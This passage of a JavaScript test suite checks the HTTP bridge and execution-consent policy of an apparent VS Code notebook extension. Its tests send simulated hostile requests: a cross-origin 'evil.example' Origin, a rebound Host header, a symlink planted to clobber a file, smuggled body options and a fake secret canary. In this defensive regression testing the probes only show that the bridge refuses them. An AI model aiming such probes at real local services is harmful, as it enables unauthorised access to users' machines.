      blocking: false,
    });
    assert.strictEqual(d.run, false, `${intent}: requested:true must not raise "never"`);
  }

  // And the other direction still works: declining is always honoured.
  const declined = await policyModule.decideExecution({
    intent: 'generate',
    requested: false,
    preview: 'print(1)',
    opts: policyOpts('always'),
  });
  assert.strictEqual(declined.run, false, 'an explicit no is honoured even when set to always');
});

test('execution modes behave, and nothing runs on empty or untrusted', async () => {
  policyModule.forgetSessionGrants();
  const always = await policyModule.decideExecution({
    intent: 'generate',
    preview: 'print(1)',
    opts: policyOpts('always'),
  });
  assert.strictEqual(always.run, true);

  const never = await policyModule.decideExecution({
    intent: 'generate',
    preview: 'print(1)',
    opts: policyOpts('never'),
  });
  assert.strictEqual(never.run, false);

  const empty = await policyModule.decideExecution({
    intent: 'generate',
    preview: '   \n  ',
    opts: policyOpts('always'),
  });
  assert.strictEqual(empty.run, false, 'an empty cell is never executed');
  assert.match(empty.reason, /nothing to run/);

  vscode.workspace.isTrusted = false;
  try {
    const untrusted = await policyModule.decideExecution({
      intent: 'generate',
      preview: 'print(1)',
      opts: policyOpts('always'),
    });
    assert.strictEqual(untrusted.run, false, 'a folder the user does not trust never executes');
    assert.match(untrusted.reason, /not trusted/);
  } finally {
    vscode.workspace.isTrusted = true;
  }
});

test('ask prompts, and a session approval is remembered then forgettable', async () => {
  policyModule.forgetSessionGrants();
  vscode.__test.shown.length = 0;

  vscode.__test.picks.push('Run it');
  const once = await policyModule.decideExecution({
    intent: 'fix',
    preview: 'print(1)',
    opts: policyOpts('ask'),
  });
  assert.strictEqual(once.run, true);
  const prompt = vscode.__test.shown.find((e) => e.kind === 'warning');
  assert.ok(prompt, 'the user is actually asked');
  assert.strictEqual(prompt.items[0].modal, true, 'a consent prompt that can be missed is not consent');
  assert.deepStrictEqual(policyModule.activeGrants(), [], 'one-off approval grants nothing');

  vscode.__test.picks.push('Always run these this session');
  const granted = await policyModule.decideExecution({
    intent: 'fix',
    preview: 'print(2)',
    opts: policyOpts('ask'),
  });
  assert.strictEqual(granted.run, true);
  assert.deepStrictEqual(policyModule.activeGrants(), ['fix']);

  // ...and it now runs without asking again.
  const shownBefore = vscode.__test.shown.length;
  const again = await policyModule.decideExecution({
    intent: 'fix',
    preview: 'print(3)',
    opts: policyOpts('ask'),
  });
  assert.strictEqual(again.run, true);
  assert.strictEqual(vscode.__test.shown.length, shownBefore, 'no second prompt');

  // A grant for one surface must not leak to another.
  const other = await policyModule.decideExecution({
    intent: 'bridge',
    preview: 'print(4)',
    opts: policyOpts('ask', 'never'),
    blocking: false,
  });
  assert.strictEqual(other.run, false, 'approving your own fixes does not approve agent pushes');

  policyModule.forgetSessionGrants();
  assert.deepStrictEqual(policyModule.activeGrants(), []);
});

test('declining once stops it being asked again for that surface', async () => {
  policyModule.forgetSessionGrants();
  vscode.__test.picks.push(undefined); // dismissed the modal
  const first = await policyModule.decideExecution({
    intent: 'generate',
    preview: 'print(1)',
    opts: policyOpts('ask'),
  });
  assert.strictEqual(first.run, false);
  const shownBefore = vscode.__test.shown.length;
  const second = await policyModule.decideExecution({
    intent: 'generate',
    preview: 'print(2)',
    opts: policyOpts('ask'),
  });
  assert.strictEqual(second.run, false);
  assert.strictEqual(vscode.__test.shown.length, shownBefore, 'not nagged after declining');
  policyModule.forgetSessionGrants();
});

test('the bridge never makes an HTTP caller wait on a dialog', async () => {
  policyModule.forgetSessionGrants();
  vscode.__test.shown.length = 0;
  const d = await policyModule.decideExecution({
    intent: 'bridge',
    preview: 'print("pushed")',
    opts: policyOpts('ask', 'ask'),
    blocking: false,
  });
  assert.strictEqual(d.run, false, 'the response does not block on a human');
  assert.strictEqual(d.pending, true, 'but the caller is told approval is outstanding');
  assert.match(d.reason, /waiting for your approval/);
  policyModule.forgetSessionGrants();
});

/* -------------------------------- bridge -------------------------------- */

function call(port, token, { method = 'POST', path: p = '/cell', body, chunks, headers = {} }) {
  return new Promise((resolve, reject) => {
    let settled = false;
    let response; // set the instant headers arrive, before the body is read
    let text = '';
    const finish = () => {
      if (settled) return;
      settled = true;
      // The server may answer (and cut us off) before we finish uploading.
      req.destroy();
      resolve({ status: response.statusCode, body: text });
    };
    const req = http.request(
      {
        host: '127.0.0.1',
        port,
        method,
        path: p,
        headers: { ...(token ? { 'x-ai-notebook-token': token } : {}), ...headers },
      },
      (res) => {
        response = res;
        res.on('data', (c) => {
          text += c;
        });
        res.on('end', finish);
        // An over-sized push is answered with 413 and the socket is reset while
        // we are still uploading, so the response itself can be cut short. The
        // status is the thing under test and we already have it.
        res.on('aborted', finish);
        res.on('error', finish);
      }
    );
    // Writing into a socket the server already reset is expected once we have an
    // answer, so only a failure BEFORE the server answered is a real error.
    // Keying this on `end` instead raced the reset: measured, it failed ~15% of
    // idle runs and 83% of runs under load, with `read ECONNRESET`.
    req.on('error', (err) => {
      if (response) return finish();
      if (settled) return undefined;
      settled = true;
      return reject(err);
    });
    if (chunks) {
      let i = 0;
      const nextChunk = () => {
        if (settled || response) return undefined;
        if (i >= chunks.length) return req.end();
        req.write(chunks[i], () => {});
        i += 1;
        return setTimeout(nextChunk, 5);
      };
      nextChunk();
    } else {
      req.end(body);
    }
  });
}

test('bridge inserts, streams, runs, and rejects bad tokens', async () => {
  const notebook = newNotebook(['x = 1']);
  const bridge = new Bridge({ resolveNotebook: () => notebook, decideRun: async () => ({ run: false, reason: 'test policy' }), infoDir: BRIDGE_HOME });
  const { port, token } = await bridge.start(0);
  try {
    const health = await call(port, token, { method: 'GET', path: '/health' });
    assert.strictEqual(health.status, 200);
    assert.match(health.body, /Test_Notebook\.ipynb/);

    const denied = await call(port, 'wrong-token', { body: JSON.stringify({ code: 'x' }) });
    assert.strictEqual(denied.status, 401);
    assert.strictEqual(notebook.cellCount, 1, 'unauthorized request must not touch the notebook');

    const inserted = await call(port, token, {
      path: '/cell?position=end&run=1',
      body: JSON.stringify({ code: 'print("from an agent")' }),
    });
    assert.strictEqual(inserted.status, 200);
    assert.strictEqual(JSON.parse(inserted.body).index, 1);
    assert.strictEqual(notebook.cellAt(1).document.getText(), 'print("from an agent")');
    // ?run=1 used to be an override. It is now only a request, and this bridge's
    // policy says no - so the cell arrives but nothing executes, and the caller
    // is told why rather than being quietly ignored.
    assert.strictEqual(vscode.__test.executed.length, 0, 'a caller cannot demand execution');
    assert.strictEqual(JSON.parse(inserted.body).ran, false);
    assert.match(JSON.parse(inserted.body).reason, /test policy/);

    const streamed = await call(port, token, {
      path: '/cell/stream?position=end',
      chunks: ['```python\n', 'import sys\n', 'print(sys.version)\n', '```'],
    });
    assert.strictEqual(streamed.status, 200);
    assert.strictEqual(notebook.cellAt(2).document.getText(), 'import sys\nprint(sys.version)');

    const markdown = await call(port, token, {
      path: '/cell?position=0&kind=markdown',
      body: JSON.stringify({ code: '# Title' }),
    });
    assert.strictEqual(markdown.status, 200);
    assert.strictEqual(notebook.cellAt(0).kind, vscode.NotebookCellKind.Markup);

    // Malformed JSON is the caller's mistake, so it is a 400 - it used to be
    // reported as a 500, which blamed the server for the client's bad request.
    const bad = await call(port, token, { body: '{not json' });
    assert.strictEqual(bad.status, 400);
    assert.match(bad.body, /not valid JSON/);
  } finally {
    await bridge.stop();
  }
});

test('drop removes the cell the writer created, leaving the rest alone', async () => {
  const notebook = newNotebook(['x = 1']);
  const writer = await CellWriter.insert(notebook, notebook.cellCount, {});
  writer.write('half a generation');
  assert.strictEqual(notebook.cellCount, 2, 'sanity: the cell was created');
  await writer.drop();
  assert.strictEqual(notebook.cellCount, 1, 'drop must remove the cell it created');
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'x = 1', 'neighbours untouched');
  writer.write('anything after drop');
  await writer.flush();
  assert.strictEqual(notebook.cellCount, 1, 'a dropped writer must not resurrect the cell');
});

test('an over-sized push is rejected and leaves no half-written cell behind', async () => {
  const notebook = newNotebook(['x = 1']);
  const bridge = new Bridge({ resolveNotebook: () => notebook, decideRun: async () => ({ run: false, reason: 'test policy' }), infoDir: BRIDGE_HOME });
  const { port, token } = await bridge.start(0);
  try {
    // 5 x 256 KiB = 1.25 MiB, comfortably over the 1 MiB cap.
    const chunk = '# junk\n'.repeat(Math.floor((256 * 1024) / 7));
    const res = await call(port, token, {
      path: '/cell/stream?position=end',
      chunks: [chunk, chunk, chunk, chunk, chunk],
    });
    assert.strictEqual(res.status, 413);
    assert.match(res.body, /body too large/);
    assert.strictEqual(
      notebook.cellCount,
      1,
      'a rejected push must not leave a cell in the notebook'
    );

    // The bridge must still be usable afterwards.
    const after = await call(port, token, {
      path: '/cell?position=end',
      body: JSON.stringify({ code: 'print("still working")' }),
    });
    assert.strictEqual(after.status, 200);
    assert.strictEqual(notebook.cellCount, 2);
    assert.strictEqual(notebook.cellAt(1).document.getText(), 'print("still working")');
  } finally {
    await bridge.stop();
  }
});

test('a stream that never sends a byte leaves no cell behind', async () => {
  // The writer used to be opened on the headers, so a client that connected and
  // then stalled - nbpush waiting on stdin that never arrived - parked an empty
  // cell in the notebook for as long as it hung.
  const notebook = newNotebook(['seed = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const res = await call(port, token, { path: '/cell/stream?position=end', chunks: [] });
    assert.strictEqual(res.status, 400);
    assert.match(res.body, /empty/);
    assert.strictEqual(notebook.cellCount, 1, 'no cell may be created for an empty push');

    // A real push still works, and says where it went.
    const ok = await call(port, token, {
      path: '/cell/stream?position=end',
      chunks: ['print(', '"hi")'],
    });
    assert.strictEqual(ok.status, 200);
    assert.strictEqual(notebook.cellCount, 2);
    assert.strictEqual(JSON.parse(ok.body).notebook, notebook.uri.fsPath);
  } finally {
    await bridge.stop();
  }
});

test('the bridge refuses malformed input instead of guessing', async () => {
  const notebook = newNotebook(['seed = 1']);
  const bridge = new Bridge({
    resolveNotebook: (hint) => (hint && !'/tmp/Test_Notebook.ipynb'.includes(hint) ? undefined : notebook),
    listNotebooks: () => ['Test_Notebook.ipynb'],
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  const code = JSON.stringify({ code: 'print(1)' });
  try {
    const before = notebook.cellCount;

    // A null body used to reach body.code and surface as a 500 with an internal
    // JavaScript message in it.
    const nul = await call(port, token, { body: 'null' });
    assert.strictEqual(nul.status, 400);
    assert.ok(!/Cannot read properties/.test(nul.body), 'no internal error leaks out');
    for (const body of ['42', '[1,2,3]', '"hi"']) {
      assert.strictEqual((await call(port, token, { body })).status, 400, body);
    }

    // An empty push used to leave an empty cell behind.
    const empty = await call(port, token, { body: JSON.stringify({ code: '   \n ' }) });
    assert.strictEqual(empty.status, 400);
    assert.match(empty.body, /nothing to insert/);

    assert.strictEqual(validate.cellKind('Markdown'), 'markdown');
    assert.strictEqual((await call(port, token, { path: '/cell?kind=Markdown', body: code })).status, 200);
    assert.strictEqual((await call(port, token, { path: '/cell?kind=mrkdown', body: code })).status, 400);
    assert.strictEqual((await call(port, token, { path: '/cell?position=2.7', body: code })).status, 400);
    assert.strictEqual((await call(port, token, { path: '/cell?position=banana', body: code })).status, 400);

    // A hint that matches nothing used to write to whatever was active.
    const missed = await call(port, token, { path: '/cell?notebook=zzzz', body: code });
    assert.strictEqual(missed.status, 409);
    assert.match(missed.body, /Test_Notebook/, 'and says what is actually open');

    assert.strictEqual(notebook.cellCount, before + 1, 'only the valid push landed');
  } finally {
    await bridge.stop();
  }
});

test('an ambiguous notebook= is refused, never resolved to whichever came first', async () => {
  // targetNotebook picked with `find`, so a hint matching several open notebooks
  // returned whichever VS Code listed first - and answered 200, so the caller
  // had no way to know it had written to the wrong file. The match is a
  // substring of the whole path, which makes `notebook=/` match every notebook
  // open. Matching none was already refused; matching several is the same
  // mistake, and was the quiet one.
  const extension = require(path.join('..', 'extension.js'));
  const { targetNotebook } = extension.__test;
  const mk = (fsPath) =>
    new vscode.NotebookDocument(
      fsPath,
      [{ kind: vscode.NotebookCellKind.Code, value: 'x = 1', languageId: 'python' }],
      { metadata: { kernelspec: { language: 'python' } } }
    );

  const scratch = mk('/w/proj/scratch_analysis.ipynb');
  const report = mk('/w/proj/production_report.ipynb');
  vscode.__test.notebooks.length = 0;
  vscode.__test.notebooks.push(scratch, report);
  vscode.window.visibleNotebookEditors.length = 0;
  vscode.window.activeNotebookEditor = undefined;

  try {
    // Unambiguous hints still resolve, and a hint matching nothing still returns
    // undefined for the bridge to turn into its own 409.
    assert.strictEqual(targetNotebook('scratch'), scratch);
    assert.strictEqual(targetNotebook('production_report'), report);
    assert.strictEqual(targetNotebook('no-such-file'), undefined);

    // Every one of these matches both notebooks.
    for (const hint of ['/', '.ipynb', '/w/proj', 'proj']) {
      assert.throws(
        () => targetNotebook(hint),
        (err) => {
          assert.strictEqual(err.status, 409, `${hint} must be a 409`);
          assert.match(err.message, /scratch_analysis\.ipynb/, 'names the candidates');
          assert.match(err.message, /production_report\.ipynb/, 'names all of them');
          return true;
        },
        `notebook=${hint} must refuse rather than choose`
      );
    }

    // And the refusal has to reach the client, not die inside the handler.
    const bridge = new Bridge({
      resolveNotebook: targetNotebook,
      decideRun: async () => ({ run: false, reason: 'test policy' }),
      infoDir: BRIDGE_HOME,
      listNotebooks: () => ['scratch_analysis.ipynb', 'production_report.ipynb'],
    });
    const { port, token } = await bridge.start(0);
    try {
      const body = JSON.stringify({ code: 'must_not_land = 1' });
      const res = await call(port, token, { path: '/cell?notebook=%2Fw%2Fproj', body });
      assert.strictEqual(res.status, 409, 'an ambiguous push is refused');
      assert.match(res.body, /matches 2 open notebooks/);
      assert.strictEqual(scratch.cellCount, 1, 'nothing written to the first match');
      assert.strictEqual(report.cellCount, 1, 'nor to the other one');

      // Reading is refused for the same reason: /cells must not answer with a
      // notebook the caller did not unambiguously ask for.
      const read = await call(port, token, { method: 'GET', path: '/cells?notebook=.ipynb' });
      assert.strictEqual(read.status, 409, 'an ambiguous read is refused too');

      // Narrowing it fixes it, which is what the message tells you to do.
      const ok = await call(port, token, { path: '/cell?notebook=production_report', body });
      assert.strictEqual(ok.status, 200);
      assert.strictEqual(report.cellCount, 2, 'the named notebook got it');
      assert.strictEqual(scratch.cellCount, 1, 'and only that one');
    } finally {
      await bridge.stop();
    }
  } finally {
    vscode.window.activeNotebookEditor = undefined;
  }
});

test('/cell/replace refuses a missing or blank index instead of destroying cell 0', async () => {
  // `Number(url.searchParams.get('index'))` mapped null, '', ' ', '-0', '0x0'
  // and '0.0' all to a valid-looking 0, so a caller that forgot the one
  // parameter naming what it destroys silently lost cell 0 - the imports.
  const notebook = newNotebook(['IMPORTANT = "six months of work"', 'b', 'c']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const body = JSON.stringify({ code: 'pwned = 1' });
    for (const q of ['', 'index=', 'index=%20', 'index=-0', 'index=0x0', 'index=0.0', 'index=%2B0', 'index=1e1']) {
      const res = await call(port, token, { path: `/cell/replace?${q}`, body });
      assert.strictEqual(res.status, 400, `?${q} must be refused`);
      assert.strictEqual(
        notebook.cellAt(0).document.getText(),
        'IMPORTANT = "six months of work"',
        `?${q} destroyed cell 0`
      );
    }
    // Saying which cell still works, including with leading zeros.
    const ok = await call(port, token, { path: '/cell/replace?index=00', body });
    assert.strictEqual(ok.status, 200);
    assert.strictEqual(notebook.cellAt(0).document.getText(), 'pwned = 1');
    assert.strictEqual(notebook.cellCount, 3, 'and replacing never adds a cell');
  } finally {
    await bridge.stop();
  }
});

test('a push the user typed over is refused, not run, and not reported ok', async () => {
  // closeWriter never read writer.foreign, though extension.js has always
  // refused to run on it. So the bridge answered ok:true for a cell holding the
  // user's own half-typed line - and with bridge.execution 'always', ran it.
  const notebook = newNotebook(['first']);
  let asked = 0;
  const notices = [];
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => {
      asked += 1;
      return { run: true, reason: 'set to always run' };
    },
    infoDir: BRIDGE_HOME,
    notify: (kind, message) => notices.push({ kind, message }),
  });
  const { port, token } = await bridge.start(0);
  try {
    const writer = await bridge.openWriter({ search: new URLSearchParams() });
    writer.write('print("from the agent")\n');
    await writer.flush();
    // The human takes the cell over mid-write.
    writer.cell().document.text = 'import os; os.system("MY OWN HALF TYPED LINE")';
    const result = await bridge.closeWriter(writer, { search: new URLSearchParams('run=1') });

    assert.strictEqual(result.ok, false, 'it must not claim success');
    assert.strictEqual(result.foreign, true, 'and must say why');
    assert.strictEqual(result.ran, false, 'and must not have run');
    assert.strictEqual(asked, 0, 'the execution policy is not even consulted');
    assert.strictEqual(
      writer.cell().document.getText(),
      'import os; os.system("MY OWN HALF TYPED LINE")',
      "the user's text is left exactly as they typed it"
    );
    assert.ok(
      notices.some((n) => /you edited that cell/i.test(n.message)),
      'and the human is told their edit stopped the push'
    );
    assert.strictEqual(vscode.__test.executed.length, 0, 'nothing executed');
  } finally {
    await bridge.stop();
  }
});

test('the bridge says when it rewrote invisible characters', async () => {
  // cellText repaired on both paths but only RETURNED the count on the sanitize
  // path, so a push whose NBSP was turned into a space was reported to nobody -
  // while the model path has always logged it.
  const notebook = newNotebook(['first']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const nbsp = 'df = 1';
    const added = await call(port, token, { body: JSON.stringify({ code: nbsp }) });
    assert.strictEqual(added.status, 200);
    assert.strictEqual(JSON.parse(added.body).repaired, 1, '/cell reports the rewrite');
    assert.strictEqual(notebook.cellAt(notebook.cellCount - 1).document.getText(), 'df = 1');

    const replaced = await call(port, token, {
      path: '/cell/replace?index=0',
      body: JSON.stringify({ code: nbsp }),
    });
    assert.strictEqual(JSON.parse(replaced.body).repaired, 1, '/cell/replace reports it too');

    // Clean code must not claim a repair that did not happen.
    const clean = await call(port, token, { body: JSON.stringify({ code: 'x = 1' }) });
    assert.strictEqual(JSON.parse(clean.body).repaired, undefined);

    // And the streaming path must WRITE the repaired text, not the raw chunk -
    // it validated and then wrote the original, on the one endpoint the
    // README's `claude -p ... | nbpush` example uses.
    const streamed = await call(port, token, {
      path: '/cell/stream',
      chunks: [nbsp],
    });
    assert.strictEqual(streamed.status, 200);
    assert.strictEqual(
      notebook.cellAt(notebook.cellCount - 1).document.getText(),
      'df = 1',
      'the streamed cell is repaired too'
    );
  } finally {
    await bridge.stop();
  }
});

test('includeOutputs off stops Revise and Fix sending the cell output', async () => {
  // describeCell honoured the flag; revisePrompt and fixPrompt called
  // readOutputs unconditionally, so the ONE cell whose output is likeliest to
  // hold a dataframe or a key was sent anyway.
  const notebook = newNotebook(['df.head()']);
  const cell = notebook.cellAt(0);
  cell.outputs = [
    {
      items: [
        { mime: 'text/plain', data: Buffer.from('CANARY_salary=999999 token=sk-live-abc') },
      ],
    },
  ];
  const off = { contextCells: 12, includeOutputs: false, model: 'claude-opus-5' };
  const on = { ...off, includeOutputs: true };

  const revisedOff = promptsModule.revisePrompt({ notebook, cell, instruction: 'tidy it', opts: off });
  assert.ok(!revisedOff.user.includes('CANARY'), 'Revise must honour the switch');
  const revisedOn = promptsModule.revisePrompt({ notebook, cell, instruction: 'tidy it', opts: on });
  assert.ok(revisedOn.user.includes('CANARY'), 'and still send it when it is on');

  // Fix keeps the traceback either way - clicking "Fix the Error" IS the
  // request to send that error - but stdout is not part of that bargain.
  const fixedOff = promptsModule.fixPrompt({ notebook, cell, opts: off });
  assert.ok(!fixedOff.user.includes('CANARY'), 'Fix must not send stdout when the switch is off');
});

test('an untrusted workspace does not become the CLI working directory', async () => {
  // The CLI is Claude Code: it runs the hooks in the folder it is started in
  // and reads that folder's CLAUDE.md. Execution and the bridge were gated on
  // isTrusted; the spawn was not, so declining to trust a repo still ran its
  // hooks the first time you asked for a cell.
  const extension = require(path.join('..', 'extension.js'));
  const { workingDirFor } = extension.__test;
  newNotebook(['x = 1']);
  // Deliberately NOT under /tmp: the stub's default notebook lives there, and
  // there the untrusted answer and the trusted answer are the same string.
  const notebook = new vscode.NotebookDocument(
    '/home/somebody/work/analysis.ipynb',
    [{ kind: vscode.NotebookCellKind.Code, value: 'x = 1', languageId: 'python' }],
    { metadata: { kernelspec: { language: 'python' } } }
  );
  const trusted = vscode.workspace.isTrusted;
  try {
    vscode.workspace.isTrusted = true;
    assert.strictEqual(
      workingDirFor(notebook),
      '/home/somebody/work',
      'a trusted folder is still used'
    );
    vscode.workspace.isTrusted = false;
    assert.strictEqual(
      workingDirFor(notebook),
      os.tmpdir(),
      'an untrusted folder must never be handed to the CLI'
    );
  } finally {
    vscode.workspace.isTrusted = trusted;
  }
});

test('a body key cannot smuggle itself in as an option', async () => {
  // The body used to be spread into the options bag, so any key a caller
  // invented became an option - and body keys beat the query string.
  const notebook = newNotebook(['a', 'b', 'c']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    // Deliberately honours `requested`, so that a body key reaching it would
    // actually execute something. A policy that refuses everything could not
    // tell the difference, and the test would prove nothing.
    decideRun: async ({ requested }) => ({ run: requested === true, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const res = await call(port, token, {
      path: '/cell?position=end',
      body: JSON.stringify({ code: 'print(1)', kind: 'markdown', position: 0, run: true }),
    });
    assert.strictEqual(res.status, 200);
    const cell = notebook.cellAt(JSON.parse(res.body).index);
    assert.strictEqual(cell.kind, vscode.NotebookCellKind.Code, 'body kind ignored');
    assert.strictEqual(JSON.parse(res.body).index, 3, 'body position ignored, query honoured');
    assert.strictEqual(vscode.__test.executed.length, 0, 'body run must not reach the policy');

    // The text fallback used to accept a non-string code and quietly use text.
    const smuggled = await call(port, token, {
      body: JSON.stringify({ code: { a: 1 }, text: 'print("smuggled")' }),
    });
    assert.strictEqual(smuggled.status, 200, 'text is still a documented alias');
    assert.strictEqual(notebook.cellAt(JSON.parse(smuggled.body).index).document.getText(), 'print("smuggled")');
  } finally {
    await bridge.stop();
  }
});

test('a poisoned push is refused by the bridge and leaves no cell', async () => {
  const notebook = newNotebook(['seed = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const before = notebook.cellCount;
    for (const [name, escaped] of [
      ['NUL', 'a\\u0000b'],
      ['unpaired surrogate', 'a\\ud800b'],
      ['U+2028', 'a\\u2028b'],
    ]) {
      const res = await call(port, token, { body: `{"code":"${escaped}"}` });
      assert.strictEqual(res.status, 400, name);
      assert.strictEqual(notebook.cellCount, before, `${name} must not create a cell`);
    }

    // Streaming is checked per chunk, before the writer is even opened. NUL is
    // used rather than a surrogate on purpose: a lone surrogate CANNOT reach
    // this route, because the sender encodes to UTF-8 and an unpaired one
    // becomes U+FFFD in transit. Only the JSON route can carry one, since
    // \ud800 there is an escape decoded after the bytes have arrived.
    const streamed = await call(port, token, {
      path: '/cell/stream?position=end',
      chunks: ['print(1)', `a${String.fromCharCode(0)}b`],
    });
    assert.strictEqual(streamed.status, 400);
    assert.strictEqual(notebook.cellCount, before, 'a poisoned chunk leaves nothing behind');

    // A valid surrogate PAIR is ordinary text and must still work.
    const emoji = await call(port, token, { path: '/cell?position=end', body: '{"code":"a\\ud83d\\ude00b"}' });
    assert.strictEqual(emoji.status, 200);
    assert.strictEqual(notebook.cellAt(JSON.parse(emoji.body).index).document.getText(), 'a\u{1F600}b');
  } finally {
    await bridge.stop();
  }
});

test('a markdown cell pushed over the bridge keeps its fenced code blocks', async () => {
  // explain() has always got this right; the bridge hard-coded fenced: true even
  // for markdown, so a pushed markdown cell lost its code blocks. The old test
  // missed it because it pushed '# Title', which has no fence.
  const notebook = newNotebook(['seed = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    // Must START with the fence: unfence only strips a leading one, so a body
    // beginning with prose would pass whether or not the bug were fixed.
    const md = '```python\nx = 1\n```\n\nThat is the setup.';
    const res = await call(port, token, {
      path: '/cell?kind=markdown&position=end',
      body: JSON.stringify({ code: md }),
    });
    assert.strictEqual(res.status, 200);
    const cell = notebook.cellAt(JSON.parse(res.body).index);
    assert.strictEqual(cell.kind, vscode.NotebookCellKind.Markup);
    assert.ok(cell.document.getText().includes('```python'), 'the fence must survive');
    assert.ok(cell.document.getText().includes('That is the setup.'), 'and so must the prose');
  } finally {
    await bridge.stop();
  }
});

test('the bridge is not reachable from a web page', async () => {
  const notebook = newNotebook(['x = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const body = JSON.stringify({ code: 'print("should never land")' });

    // The token in the query string made a plain cross-origin form POST enough,
    // because it needs no custom header and therefore no preflight.
    const viaQuery = await call(port, undefined, { path: `/cell?token=${token}`, body });
    assert.strictEqual(viaQuery.status, 401, 'a token in the URL is not accepted');

    // Browsers always send Origin; curl and nbpush never do.
    const withOrigin = await call(port, token, { body, headers: { origin: 'https://evil.example' } });
    assert.strictEqual(withOrigin.status, 401, 'anything with an Origin is refused');

    // A rebound DNS name arrives with its own Host.
    const rebound = await call(port, token, { body, headers: { host: 'evil.example' } });
    assert.strictEqual(rebound.status, 401, 'only loopback hostnames are served');

    assert.strictEqual(notebook.cellCount, 1, 'and none of them wrote anything');

    // The legitimate client still works.
    const ok = await call(port, token, { path: '/cell?position=end', body });
    assert.strictEqual(ok.status, 200);
    assert.strictEqual(notebook.cellCount, 2);
  } finally {
    await bridge.stop();
  }
});

test('the example command does not contain the token', async () => {
  const notebook = newNotebook(['x = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { token } = await bridge.start(0);
  try {
    const example = bridge.curlExample();
    assert.ok(
      !example.includes(token),
      'a live credential must not be put on the clipboard - it ends up in shell history'
    );
    assert.match(example, /x-ai-notebook-token/, 'it still sends the header');
  } finally {
    await bridge.stop();
  }
});

test('the token file is not written through a symlink, and tightens a loose directory', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-nb-perm-'));
  const victim = path.join(dir, 'precious.txt');
  fs.writeFileSync(victim, 'DO NOT CLOBBER');
  fs.symlinkSync(victim, path.join(dir, 'bridge.json'));
  fs.chmodSync(dir, 0o755);

  const notebook = newNotebook(['x = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: dir,
  });
  await bridge.start(0);
  try {
    assert.strictEqual(
      fs.readFileSync(victim, 'utf8'),
      'DO NOT CLOBBER',
      'writeFileSync would have followed the symlink and overwritten this'
    );
    const info = JSON.parse(fs.readFileSync(path.join(dir, 'bridge.json'), 'utf8'));
    assert.strictEqual(info.pid, process.pid, 'the real token file replaced the link');
    if (process.platform !== 'win32') {
      assert.strictEqual(
        fs.statSync(dir).mode & 0o777,
        0o700,
        "mkdirSync's mode is ignored on an existing directory, so it must be chmod'd"
      );
      assert.strictEqual(fs.statSync(path.join(dir, 'bridge.json')).mode & 0o777, 0o600);
    }
  } finally {
    await bridge.stop();
  }
});

test('stopping one window does not delete another window\'s token file', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-nb-own-'));
  const notebook = newNotebook(['x = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: dir,
  });
  await bridge.start(0);
  // Pretend another VS Code window claimed the path after we advertised.
  const file = path.join(dir, 'bridge.json');
  fs.writeFileSync(file, JSON.stringify({ port: 1, token: 'theirs', pid: process.pid + 1 }));
  await bridge.stop();
  assert.ok(fs.existsSync(file), 'we must not tidy away a file that is not ours');
  assert.strictEqual(JSON.parse(fs.readFileSync(file, 'utf8')).token, 'theirs');
});

test('the bridge writes its token only inside the directory it was given', async () => {
  // Regression: infoDir used to be a module constant, so running this suite
  // clobbered and then deleted the token file of a live bridge in another window.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-nb-isolated-'));
  const notebook = newNotebook(['x = 1']);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: dir,
  });
  const { port, token } = await bridge.start(0);
  const info = path.join(dir, 'bridge.json');
  try {
    assert.strictEqual(bridge.infoFile, info, 'the bridge honours the injected directory');
    assert.ok(fs.existsSync(info), 'the token file lands in the injected directory');
    const parsed = JSON.parse(fs.readFileSync(info, 'utf8'));
    assert.strictEqual(parsed.port, port);
    assert.strictEqual(parsed.token, token);
    assert.strictEqual(parsed.pid, process.pid);
  } finally {
    await bridge.stop();
  }
  assert.ok(!fs.existsSync(info), 'stop() removes the file it wrote');
});

test('bridge refuses to start when no notebook is open', async () => {
  const bridge = new Bridge({ resolveNotebook: () => undefined, decideRun: async () => ({ run: false, reason: 'test policy' }), infoDir: BRIDGE_HOME });
  const { port, token } = await bridge.start(0);
  try {
    const res = await call(port, token, { body: JSON.stringify({ code: 'x = 1' }) });
    assert.strictEqual(res.status, 409, 'nothing to write into is a conflict, not a server fault');
    assert.match(res.body, /no notebook is open/);
  } finally {
    await bridge.stop();
  }
});

